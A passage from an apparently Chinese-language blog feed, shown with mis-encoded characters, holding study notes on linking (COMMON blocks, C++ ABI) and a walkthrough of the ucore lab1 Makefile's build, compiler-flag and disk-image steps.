ä»¶ä¸­çš„å„ä¸ªæ®µåœ¨é“¾æ¥åçš„<strong>è™šæ‹Ÿåœ°å€</strong>å°±å·²ç»ç¡®å®šäº†</li><li>å½“å‰é¢ä¸€æ­¥å®Œæˆä¹‹åï¼Œé“¾æ¥å™¨å¼€å§‹è®¡ç®—å„ä¸ªç¬¦å·çš„è™šæ‹Ÿåœ°å€</li></ul><p>æˆ‘ç°åœ¨çš„çŸ¥è¯†ä¼¼ä¹è¿˜åœç•™åœ¨é™æ€é“¾æ¥çš„æ¡†æ¶é‡Œé¢. è¿˜æ˜¯ç»§ç»­çœ‹å§, ä¹¦é‡Œä¹Ÿæœ‰åŠ¨æ€é“¾æ¥çš„ç»†èŠ‚. åœ¨CSAPPé‡Œä¹Ÿæ²¡æåŠ.</p><p><strong>4.3 COMMON å—</strong> </p><ul><li>COMMON ç±»å‹çš„é“¾æ¥è§„åˆ™æ˜¯é’ˆå¯¹ç¬¦å·éƒ½æ˜¯å¼±ç¬¦å·çš„æƒ…å†µï¼Œ å¦‚æœå…¶ä¸­æœ‰ä¸€ä¸ªç¬¦å· ä¸ºå¼ºç¬¦å·ï¼Œé‚£ä¹ˆæœ€ç»ˆè¾“å‡ºç»“æœä¸­çš„ç¬¦å·æ‰€å ç©ºé—´ä¸å¼ºç¬¦å·ç›¸åŒ, å¦‚æœæœ‰å¼±ç¬¦å·çš„å¤§å°å¤§äºå¼ºç¬¦å·çš„å¤§å°, é‚£ä¹ˆè¿æ¥å™¨ä¼šç»™å‡ºè­¦å‘Š.</li><li>ç›´æ¥å¯¼è‡´éœ€è¦COMMON æœºåˆ¶çš„åŸå› æ˜¯ç¼–è¯‘å™¨å’Œé“¾æ¥å™¨å…è®¸ä¸åŒç±»å‹çš„å¼±ç¬¦å·å­˜åœ¨ï¼Œä½†æœ€æœ¬è´¨çš„åŸå› è¿˜æ˜¯ é“¾æ¥å™¨ä¸æ”¯æŒç¬¦å·ç±»å‹ï¼Œå³é“¾æ¥å™¨æ— æ³•åˆ¤æ–­å„ä¸ªç¬¦å·çš„ç±»å‹æ˜¯å¦ä¸€è‡´ã€‚</li><li>ç¼–è¯‘å™¨åœ¨é“¾æ¥å‰æ— æ³•ä¸ºå¼±ç¬¦å·åœ¨BSS æ®µåˆ†é…ç©ºé—´ï¼Œå› ä¸ºæ‰€é¡»è¦ç©ºé—´çš„å¤§å°æœªçŸ¥ã€‚å¦‚æœåªä½¿ç”¨<code>gcc -c</code>çš„è¯ä¼šå‘ç°æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡æ²¡æœ‰å‡ºç°åœ¨bssæ®µ. ä½†æ˜¯é“¾æ¥å™¨åœ¨é“¾æ¥è¿‡ç¨‹ä¸­å¯ä»¥ç¡®å®šå¼±ç¬¦å·çš„å¤§å°.</li><li><code>-fno-common</code> or <code>__attribute__((nocommon));</code> ç¦ç”¨commonå¤„ç†.</li><li>ä¸€æ—¦ä¸€ä¸ªæœªåˆå§‹åŒ–çš„å…¨å±€å˜èœ‡ä¸æ˜¯ä»¥ COMMON å—çš„å½¢å¼å­˜åœ¨ï¼Œé‚£ä¹ˆå®ƒå°±ç›¸å½“äºä¸€ä¸ªå¼ºç¬¦å·ï¼Œå¦‚æœå…¶ä»–ç›®æ ‡æ–‡ä»¶ä¸­è¿˜æœ‰åŒä¸€ä¸ªå˜é‡çš„å¼ºç¬¦å·å®šä¹‰ï¼Œé“¾æ¥æ—¶å°±ä¼šå‘ç”Ÿç¬¦å·é‡å¤å®šä¹‰é”™è¯¯ã€‚</li></ul><p><strong>4.4 C+ï¼‹ç›¸å…³é—®é¢˜</strong> P135</p><p><strong>4.4.2 å…¨å±€æ„é€ ä¸ææ„</strong> </p><ul><li>Linux ç³»ç»Ÿä¸‹ä¸€èˆ¬ç¨‹åºçš„å…¥å£æ˜¯ â€œ_startâ€. è¿™ä¸ªå‡½æ•°æ˜¯ Linux ç³»ç»Ÿåº“ (Glibc) çš„ä¸€éƒ¨åˆ†</li><li>åˆ©ç”¨<code>.initå’Œ.finiæ®µ</code>çš„ç‰¹æ€§ï¼Œ C++çš„å…¨å±€æ„é€ å’Œææ„å‡½æ•°å°±ç”±æ­¤å®ç°</li></ul><p><strong>4.4.3 C+ï¼‹ä¸ ABI</strong>  </p><ul><li>å…¶ä¸­æˆ‘ä»¬æŠŠç¬¦å·ä¿®é¥° æ ‡å‡†ã€å˜é‡å†…å­˜å¸ƒå±€ã€å‡½æ•°è°ƒç”¨æ–¹å¼ç­‰è¿™äº›è·Ÿå¯æ‰§è¡Œä»£ç äºŒè¿›åˆ¶å…¼å®¹æ€§ç›¸å…³çš„å†…å®¹ç§°ä¸º ABI (Application Binary Interface).</li><li>å½±å“ABIçš„å› ç´ . P139</li></ul><p>é™æ€åº“é“¾æ¥:</p><ul><li>VIsual C+ï¼‹ä¹Ÿæä¾›äº†ä¸ Lmuxä¸‹çš„arç±»ä¼¼çš„å·¥å…·ï¼Œå«lib.exeï¼Œè¿™ä¸ªç¨‹åºå¯ä»¥ç”¨æ¥åˆ›å»º,æå–,åˆ—ä¸¾libæ–‡ä»¶ä¸­çš„å†…å®¹ã€‚</li><li>P143 é“¾æ¥çš„ä¸€ä¸ªç¤ºä¾‹è¿‡ç¨‹</li></ul><p>4.6.2 æœ€â€œå°ï¼‚çš„ç¨‹åº</p><blockquote><p>åšç€åšç€å°±åšåˆ°æ€ç»´å¯¼å›¾ä¸Šå»äº†â€¦</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ucore makefileåˆ†æ</title>
    <link href="/2022-04/Archive-ucore-makefile/"/>
    <url>/2022-04/Archive-ucore-makefile/</url>
    
    <content type="html"><![CDATA[<p>è´´ä¸ªå‡ºå¤„: -&gt; <a href="https://www.jianshu.com/p/2f95d38afa1d">link</a> </p><p>ä¸å¦¨å¯¹æ•´ä¸ªlab1æ‰€æä¾›çš„Makefileè¿›è¡Œè§£é‡Šå¦‚ä¸‹ï¼š</p><p>ä¸å¦¨é¦–å…ˆè€ƒè™‘Makefileä¸­ç”Ÿæˆucore.imgç›¸å…³çš„ä¸»è¦ä»£ç (æš‚æ—¶ä¸è€ƒè™‘ç»†èŠ‚é—®é¢˜)æ¥æè¿°ç”Ÿæˆå‡ºucore.imgçš„æ¯ä¸€ä¸ªå…·ä½“æ­¥éª¤:</p><ul><li><p>ç”Ÿæˆkernel:</p><ul><li>é¦–å…ˆæ˜¯<code>$(call add_files_cc,$(call listf_cc,$(LIBDIR)),libs,)</code>è¿™ä¸€æ®µä»£ç ï¼Œå«ä¹‰æ˜¯å¯»æ‰¾libsç›®å½•ä¸‹çš„æ‰€æœ‰å…·æœ‰.c, .såç¼€çš„æ–‡ä»¶ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„.oæ–‡ä»¶ï¼Œæ”¾ç½®åœ¨obj/libs/æ–‡ä»¶å¤¹ä¸‹ï¼Œå…·ä½“ç”Ÿæˆçš„æ–‡ä»¶æ˜¯printfmt.o, string.oæ–‡ä»¶ï¼Œä¸æ­¤åŒæ—¶ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸‹è¿˜ç”Ÿæˆäº†.dæ–‡ä»¶ï¼Œè¿™æ˜¯Makefileè‡ªåŠ¨ç”Ÿæˆçš„ä¾èµ–æ–‡ä»¶åˆ—è¡¨æ‰€å­˜æ”¾çš„ä½ç½®ï¼Œæ¯”å¦‚æ‰“å¼€string.dæ–‡ä»¶å¯ä»¥å‘ç°ï¼Œstring.oæ–‡ä»¶çš„ç”Ÿæˆä¾èµ–äºstring.c, string.h, x86.h, defs.hå››ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸æˆ‘ä»¬å¯¹äºä»£ç çš„è§‚å¯Ÿæ˜¯ä¸€è‡´çš„ï¼›è¿™éƒ¨åˆ†ç¼–è¯‘æ‰€ä½¿ç”¨çš„ç¼–è¯‘é€‰é¡¹ä¿å­˜åœ¨CFLAGSå˜é‡ä¸‹ï¼Œå…³äºå…·ä½“æ¯ä¸€ä¸ªä½¿ç”¨åˆ°çš„gccç¼–è¯‘é€‰é¡¹çš„å«ä¹‰ï¼Œå°†åœ¨ä¸‹æ–‡å…·ä½“åˆ†æMakefileä¸­å®šä¹‰CFLAGSå˜é‡çš„éƒ¨åˆ†è¿›è¡Œè¯¦ç»†æè¿°ï¼›</li><li><code>$(call add_files_cc,$(call listf_cc,$(KSRCDIR)),kernel,$(KCFLAGS)</code>è¿™ä¸€æ®µä»£ç å°†ç”¨äºç”Ÿæˆkernelçš„æ‰€æœ‰å­ç›®å½•ä¸‹åŒ…å«çš„CTYPEæ–‡ä»¶ï¼ˆ.s, .cæ–‡ä»¶ï¼‰æ‰€å¯¹åº”çš„.oæ–‡ä»¶ä»¥åŠ.dæ–‡ä»¶ï¼Œè¿™æ®µä»£ç ä¸ä¸Šè¿°ç”Ÿæˆobj/libs/*.oæ–‡ä»¶çš„ä»£ç ç±»ä¼¼ï¼ŒåŒºåˆ«ä»…åœ¨äºå…¶è¿˜æ–°æŒ‡å®šäº†è‹¥å¹²gccç¼–è¯‘é€‰é¡¹ï¼Œå­˜æ”¾åœ¨KCFLAGSå˜é‡ä¸­ï¼Œå…·ä½“ä¸ºåˆ¶å®šäº†è‹¥å¹²å­˜æ”¾åœ¨KINCLUDEå˜é‡ä¸‹çš„å¤´æ–‡ä»¶ï¼›å…·ä½“è€Œè¨€ï¼Œè¯¥å‘½ä»¤æœ€ç»ˆç”Ÿæˆçš„æ–‡ä»¶ä¸ºobj/kernä¸‹å­ç›®å½•é‡Œçš„ä»¥stdio, readline, panic, kdebug, kmonitor, clock, console, picirq, intr, trap, vector, trapentry, pmmä¸ºå‰ç¼€çš„.d, .oæ–‡ä»¶ï¼›</li><li>æ¥ä¸‹æ¥<code>$(kernel): tools/kernel.ld</code>è¡¨ç¤º/bin/kernelæ–‡ä»¶ä¾èµ–äºtools/kernel.ldæ–‡ä»¶ï¼Œå¹¶ä¸”æ²¡æœ‰æŒ‡å®šç”Ÿæˆè§„åˆ™ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ²¡æœ‰é¢„å…ˆå‡†å¤‡å¥½kernel.ldï¼Œå°±ä¼šåœ¨makeçš„æ—¶å€™äº§ç”Ÿé”™è¯¯ï¼›ä¹‹åçš„<code>$(kernel): $(KOBJS)</code>è¡¨ç¤ºkernelæ–‡ä»¶çš„ç”Ÿæˆè¿˜ä¾èµ–äºä¸Šè¿°ç”Ÿæˆçš„obj/libs, obj/kernelsä¸‹çš„.oæ–‡ä»¶ï¼Œå¹¶ä¸”ç”Ÿæˆè§„åˆ™ä¸ºä½¿ç”¨ldé“¾æ¥å™¨å°†è¿™äº›.oæ–‡ä»¶è¿æ¥æˆkernelæ–‡ä»¶ï¼Œå…¶ä¸­ldçš„-Tè¡¨ç¤ºæŒ‡å®šä½¿ç”¨kernel.ldæ¥æ›¿ä»£é»˜è®¤çš„é“¾æ¥å™¨è„šæœ¬ï¼›å…³äºLDFLAGSä¸­çš„é€‰é¡¹å«ä¹‰ï¼Œå°†åœ¨ä¸‹æ–‡ä¸­æè¿°LDFLAGSå˜é‡å®šä¹‰çš„æ—¶å€™è¿›è¡Œæè¿°ï¼›ä¹‹åè¿˜ä½¿ç”¨objdumpåæ±‡ç¼–å‡ºkernelçš„æ±‡ç¼–ä»£ç ï¼Œ-Sè¡¨ç¤ºå°†æºä»£ç ä¸æ±‡ç¼–ä»£ç æ··åˆå±•ç¤ºå‡ºæ¥ï¼Œè¿™éƒ¨åˆ†ä»£ç æœ€ç»ˆä¿å­˜åœ¨kernel.asmæ–‡ä»¶ä¸­ï¼›-tè¡¨ç¤ºæ‰“å°å‡ºæ–‡ä»¶çš„ç¬¦å·è¡¨è¡¨é¡¹ï¼Œç„¶åé€šè¿‡ç®¡é“å°†å¸¦æœ‰ç¬¦å·è¡¨çš„åæ±‡ç¼–ç»“æœä½œä¸ºsedå‘½ä»¤çš„æ ‡å‡†è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œæœ€ç»ˆå°†ç¬¦å·è¡¨ä¿¡æ¯ä¿å­˜åˆ°kernel.symæ–‡ä»¶ä¸­ï¼›</li></ul></li><li><p>ç”Ÿæˆbootblockæ–‡ä»¶ï¼š</p><ul><li><p>é¦–å…ˆæ˜¯</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(<span class="hljs-built_in">foreach</span> f,<span class="hljs-variable">$(bootfiles)</span>,$(<span class="hljs-built_in">call</span> cc_compile,<span class="hljs-variable">$(f)</span>,<span class="hljs-variable">$(CC)</span>,<span class="hljs-variable">$(CFLAGS)</span> -Os -nostdinc)</span><br></code></pre></div></td></tr></table></figure><p>è¿™ä¸€æ®µä»£ç ï¼Œè¡¨ç¤ºå°†boot/æ–‡ä»¶å¤¹ä¸‹çš„bootasm.S, bootmain.cä¸¤ä¸ªæ–‡ä»¶ç¼–è¯‘æˆç›¸åº”çš„.oæ–‡ä»¶ï¼Œå¹¶ä¸”ç”Ÿæˆä¾èµ–æ–‡ä»¶.dï¼›å…¶ä¸­æ¶‰åŠåˆ°çš„ä¸¤ä¸ªgccç¼–è¯‘é€‰é¡¹å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>-nostdinc: ä¸æœç´¢é»˜è®¤è·¯å¾„å¤´æ–‡ä»¶ï¼›</li><li>-0s: é’ˆå¯¹ç”Ÿæˆä»£ç çš„å¤§å°è¿›è¡Œä¼˜åŒ–ï¼Œè¿™æ˜¯å› ä¸ºbootloaderçš„æ€»å¤§å°è¢«é™åˆ¶ä¸ºä¸å¤§äº512-2=510å­—èŠ‚ï¼›</li></ul></li><li><p>æ¥ä¸‹æ¥ç”±ä»£ç </p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(bootblock)</span>: <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,<span class="hljs-variable">$(bootfiles)</span>)</span> | <span class="hljs-variable">$(<span class="hljs-built_in">call</span> totarget,sign)</span><br></code></pre></div></td></tr></table></figure><p>å¯çŸ¥ï¼Œbootblockä¾èµ–äºbootasm.o, bootmain.oæ–‡ä»¶ä¸signæ–‡ä»¶ï¼Œå…¶ä¸­ä¸¤ä¸ª.oæ–‡ä»¶ç”±ä»¥ä¸‹è§„åˆ™ç”Ÿæˆï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-variable">$(V)</span><span class="hljs-variable">$(LD)</span> <span class="hljs-variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="hljs-variable">$^</span> -o <span class="hljs-variable">$(<span class="hljs-built_in">call</span> toobj,bootblock)</span><br></code></pre></div></td></tr></table></figure><p>: ä½¿ç”¨ldé“¾æ¥å™¨å°†ä¾èµ–çš„.oæ–‡ä»¶é“¾æ¥æˆbootblock.oæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­é™¤äº†$(LDFLAGS)ä¹‹å¤–çš„å…¶ä»–é€‰é¡¹å«ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>-Nï¼šå°†ä»£ç æ®µå’Œæ•°æ®æ®µè®¾ç½®ä¸ºå¯è¯»å¯å†™ï¼›</li><li>-eï¼šè®¾ç½®å…¥å£ï¼›</li><li>-Ttextï¼šè®¾ç½®èµ·å§‹åœ°å€ä¸º0X7C00ï¼›</li></ul></li><li><p><code>@$(OBJDUMP) -S $(call objfile,bootblock) &gt; $(call asmfile,bootblock)</code>: ä½¿ç”¨objdumpå°†ç¼–è¯‘ç»“æœåæ±‡ç¼–å‡ºæ¥ï¼Œä¿å­˜åœ¨bootclock.asmä¸­ï¼Œ-Sè¡¨ç¤ºå°†æºä»£ç ä¸æ±‡ç¼–ä»£ç æ··åˆè¡¨ç¤ºï¼›</p></li><li><p><code>@$(OBJCOPY) -S -O binary $(call objfile,bootblock) $(call outfile,bootblock)</code>: ä½¿ç”¨objcopyå°†bootblock.oäºŒè¿›åˆ¶æ‹·è´åˆ°bootblock.outï¼Œå…¶ä¸­ï¼š</p><ul><li>-Sï¼šè¡¨ç¤ºç§»é™¤ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯ï¼›</li><li>-Oï¼šè¡¨ç¤ºæŒ‡å®šè¾“å‡ºæ ¼å¼ï¼›</li></ul></li><li><p><code>@$(call totarget,sign) $(call outfile,bootblock) $(bootblock)</code>: ä½¿ç”¨signç¨‹åº, åˆ©ç”¨bootblock.outç”Ÿæˆbootblock;</p></li><li><p><code>$(call add_files_host,tools/sign.c,sign,sign</code>: åˆ©ç”¨tools/sing.cç”Ÿæˆsign.o, <code>$(call create_target_host,sign,sign)</code>åˆ™åˆ©ç”¨sign.oç”Ÿæˆsignï¼Œè‡³æ­¤bootblockæ‰€ä¾èµ–çš„æ–‡ä»¶å‡ç”Ÿæˆå®Œæ¯•ï¼›</p></li></ul></li><li><p>æœ€åä¸€ä¸ªéƒ¨åˆ†æ˜¯åˆ©ç”¨ddå‘½ä»¤ä½¿ç”¨bootblock, kernelæ–‡ä»¶æ¥ç”Ÿæˆucore.imgæ–‡ä»¶ï¼š</p><ul><li><code>$(V)dd if=/dev/zero of=$@ count=10000</code> å‘½ä»¤è¡¨ç¤ºä»/dev/zeroæ–‡ä»¶ä¸­è·å–10000ä¸ªblockï¼Œæ¯ä¸€ä¸ªblockä¸º512å­—èŠ‚ï¼Œå¹¶ä¸”å‡ä¸ºç©ºå­—ç¬¦ï¼Œå¹¶ä¸”è¾“å‡ºåˆ°ç›®æ ‡æ–‡ä»¶ucore.imgä¸­ï¼›</li><li><code>$(V)dd if=$(bootblock) of=$@ conv=notrunc</code> å‘½ä»¤è¡¨ç¤ºä»bootblockæ–‡ä»¶ä¸­è·å–æ•°æ®ï¼Œå¹¶ä¸”è¾“å‡ºåˆ°ç›®æ ‡æ–‡ä»¶ucore.imgä¸­ï¼Œ-notructé€‰é¡¹è¡¨ç¤ºä¸è¦å¯¹æ•°æ®è¿›è¡Œåˆ å‡ï¼›</li><li><code>$(V)dd if=$(kernel) of=$@ seek=1 conv=notrunc</code> å‘½ä»¤è¡¨ç¤ºä»kernelæ–‡ä»¶ä¸­è·å–æ•°æ®ï¼Œå¹¶ä¸”è¾“å‡ºåˆ°ç›®æ ‡æ–‡ä»¶ucore.imgä¸­, å¹¶ä¸”seek = 1è¡¨ç¤ºè·³è¿‡ç¬¬ä¸€ä¸ªblockï¼Œè¾“å‡ºåˆ°ç¬¬äºŒä¸ªå—ï¼›</li></ul></li><li><p>è‡³æ­¤ï¼Œå…³äºç”Ÿæˆucore.imgæ–‡ä»¶çš„ä¸»è¦çš„Makefileå‘½ä»¤åˆ†æå®Œæˆï¼›</p></li><li><p>æ¥ä¸‹æ¥å°†å°±æ•´ä¸ªMakefileæ–‡ä»¶ä¸­çš„å…¶ä»–æ¯ä¸ªéƒ¨åˆ†è¿›è¡Œåˆ†æ:é¦–å…ˆåœ¨Makefileçš„æœ€å¼€å§‹æ˜¯å¯¹å„ç§å¸¸é‡çš„åˆå§‹åŒ–ï¼š</p></li></ul><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go">PROJ    := challenge<br>EMPTY   :=<br>SPACE   := $(EMPTY) $(EMPTY)<br>SLASH   := /<br><br>V       :=<br></code></pre></div></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥éƒ¨åˆ†åˆ™ç”¨äºæ¨æ–­ç¯å¢ƒä¸­è°ƒç”¨æ‰€å®‰è£…çš„gccåº”å½“ä½¿ç”¨çš„å‘½ä»¤ï¼š<br> åœ¨æœ¬éƒ¨åˆ†ï¼Œå¦‚æœä¸ºå®šä¹‰GCCPREFIXå˜é‡ï¼Œåˆ™åˆ©ç”¨äº†linux bashä¸­çš„æŠ€å·§æ¥æ¨æ–­æ‰€ä½¿ç”¨çš„gccå‘½ä»¤æ˜¯ä»€ä¹ˆ, åœ¨æœ¬éƒ¨åˆ†é¦–å…ˆçŒœæµ‹gccå‘½ä»¤çš„å‰ç¼€æ˜¯i386-elf-ï¼Œå› æ­¤æ‰§è¡Œi386-elf-objdump -iå‘½ä»¤ï¼Œ2&gt;&amp;1è¡¨ç¤ºå°†é”™è¯¯è¾“å‡ºä¸€èµ·è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºé‡Œï¼Œç„¶åé€šè¿‡ç®¡é“çš„æ–¹å¼ä¼ é€’ç»™ä¸‹ä¸€æ¡bashå‘½ä»¤grep â€˜^elf32-i386$$â€™ &gt;/dev/null 2&gt;&1;ï¼Œ&gt;/dev/nullè¿™éƒ¨åˆ†è¡¨ç¤ºå°†æ ‡å‡†è¾“å‡ºè¾“å‡ºåˆ°ä¸€ä¸ªç©ºè®¾å¤‡é‡Œï¼Œè€Œè¾“å…¥ä¸Šä¸€æ¡å‘½ä»¤å‘é€ç»™grepçš„æ ‡å‡†è¾“å‡ºï¼ˆä½œä¸ºgrepçš„è¾“å…¥ï¼‰ä¸­å¯ä»¥åŒ¹é…åˆ°â€™^elf32-i386$$â€™çš„è¯ï¼Œåˆ™è¯´æ˜i386-elf-objdumpè¿™ä¸€å‘½ä»¤æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæ¡ä»¶æ»¡è¶³ï¼Œç”±echoè¾“å‡ºâ€™i386-elf-â€˜ï¼Œç”±äºæ˜¯åœ¨$()é‡Œçš„bashå‘½ä»¤ï¼Œè¿™ä¸ªè¾“å‡ºä¼šä½œä¸ºå€¼è¢«èµ‹ç»™GCCPREFIXå˜é‡ï¼›å¦‚æœi386-elf-objdumpå‘½ä»¤ä¸å­˜åœ¨ï¼Œåˆ™çŒœæµ‹ä½¿ç”¨çš„gccå‘½ä»¤ä¸åŒ…å«å…¶ä»–å‰ç¼€ï¼Œåˆ™ç»§ç»­æŒ‰ç…§ä¸Šè¿°æ–¹æ³•ï¼Œæµ‹è¯•objdumpè¿™æ¡å‘½ä»¤æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨åˆ™GCCPREFIXä¸ºç©ºä¸²ï¼Œå¦åˆ™ä¹‹é—´æŠ¥é”™ï¼Œè¦æ±‚æ˜¾ç¤ºåœ°æä¾›gccçš„å‰ç¼€ä½œä¸ºGCCPREFIXå˜é‡çš„æ•°å€¼ï¼ˆå¯ä»¥åœ¨ç¯å¢ƒå˜é‡ä¸­æŒ‡å®šï¼‰ï¼›</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ifndef GCCPREFIX<br>GCCPREFIX := $(shell <span class="hljs-keyword">if</span> i386-elf-objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;^elf32-i386$$&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-&#x27;</span>; \<br>    <span class="hljs-keyword">elif</span> objdump -i 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;elf32-i386&#x27;</span> &gt;/dev/null 2&gt;&amp;1; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span>; \<br>    <span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find an i386-elf version of GCC/binutils.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory with i386-elf-gcc in your PATH?&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** If your i386-elf toolchain is installed with a command&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** prefix other than &#x27;i386-elf-&#x27;, set your GCCPREFIX&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** environment variable to that prefix and run &#x27;make&#x27; again.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** To turn off this error, run &#x27;gmake GCCPREFIX= ...&#x27;.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥éƒ¨åˆ†ä¸ä¸Šè¿°æ–¹æ³•ä¸€è‡´ï¼Œåˆ©ç”¨bashå‘½ä»¤æ¥æ¨æ–­qemuçš„å‘½ä»¤ï¼Œå› æ­¤å…·ä½“ç»†èŠ‚ä¸å†èµ˜è¿°ï¼›</li></ul><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># try to infer the correct QEMU</span><br>ifndef QEMU<br>QEMU := $(shell <span class="hljs-keyword">if</span> <span class="hljs-built_in">which</span> qemu-system-i386 &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu-system-i386&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> i386-elf-qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;i386-elf-qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">which</span> qemu &gt; /dev/null; \<br>    <span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;qemu&#x27;</span>; <span class="hljs-built_in">exit</span>; \<br>    <span class="hljs-keyword">else</span> \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Error: Couldn&#x27;t find a working QEMU executable.&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*** Is the directory containing the qemu binary in your PATH&quot;</span> 1&gt;&amp;2; \<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;***&quot;</span> 1&gt;&amp;2; <span class="hljs-built_in">exit</span> 1; <span class="hljs-keyword">fi</span>)<br>endi<br></code></pre></div></td></tr></table></figure><ul><li>æ¥ä¸‹æ¥çš„éƒ¨åˆ†å®šä¹‰äº†å„ç§ç¼–è¯‘å‘½ä»¤ä»¥åŠç¼–è¯‘é€‰é¡¹ï¼Œå…¶ä¸­-fno-stack-protectorç¼–è¯‘é€‰é¡¹çš„ç¡®å®šä¹Ÿä½¿ç”¨äº†ä¸ä¸Šæ–‡ç¡®å®šGCCPREFIXç›¸ä¼¼çš„æŠ€å·§ï¼Œå·§å¦™åœ°åˆ©ç”¨äº†linux bashä¸­ &amp;&amp; è¿æ¥èµ·æ¥çš„ä¸¤æ¡æŒ‡ä»¤ï¼Œå¦‚æœç¬¬ä¸€æ¡æŒ‡ä»¤å‡ºé”™ï¼Œåˆ™ç¬¬äºŒæ¡æŒ‡ä»¤ä¸ä¼šæ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œæ¥ç¡®è®¤å½“å‰çš„gccæ˜¯å¦å…è®¸ä½¿ç”¨ -fno-stack-protectorè¿™ä¸€ç¼–è¯‘é€‰é¡¹ï¼›</li><li>è¯¥æ®µMakefileä»£ç ä¸­æ‰€è®¾è®¡çš„æ‰€æœ‰gccç¼–è¯‘é€‰é¡¹å’Œé“¾æ¥å™¨ldé€‰é¡¹çš„ä½œç”¨åˆ†åˆ«å¦‚ä¸‹ï¼š<ul><li>-gï¼šåœ¨ç¼–è¯‘ä¸­åŠ 